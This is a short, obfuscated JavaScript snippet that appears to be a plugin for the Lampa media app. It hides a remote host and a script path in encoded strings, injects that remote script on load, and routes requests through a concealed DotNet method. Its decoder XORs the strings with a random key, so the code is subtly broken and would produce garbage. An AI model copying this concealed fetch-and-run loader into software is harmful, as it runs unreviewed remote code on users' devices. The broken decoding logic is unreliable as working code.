
(function(){
  'use strict';


  const a=Math.random().toString(36).substring(2,12),
        b=(x,y)=>btoa(x.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^y.charCodeAt(i%y.length))).join('')),
        c=x=>atob(x).split('').map((d,j)=>String.fromCharCode(d.charCodeAt(0)^a.charCodeAt(j%a.length))).join('');


  const d={
    k1:'Y2hwYng=',k2:'YWJtc3gudGVjaA==',k3:'L2ludmMtcmNoLmpz'
  };


  const e=f=>c(d[f]);
  const f=e('k1')+e('k2')+'/',g=f+e('k3');


  const h=function(){
    this.i=new Lampa.Reguest(),
    this.j=q=>this.i.timeout(q),
    this.k=(r,s,t,u,v)=>{
      const w=r.split(f).pop().split('?');
      w[0].indexOf(c('aHR0cA=='))>=0?
        this.i[s](r,t,u,v):DotNet.invokeMethodAsync(c('SmluRW5lcmd5'),w[0],w[1])
          .then(x=>{t(c(x))}).catch(y=>{console.log(c('RXJyb3I='),y),u(y)})
    };
  };

  if(!window.rch){
    Lampa.Utils.putScript([g],()=>{},!1,()=>{
      window.rch.startTypeInvoke||window.rch.typeInvoke(f,()=>{})},!0)
  }

})();
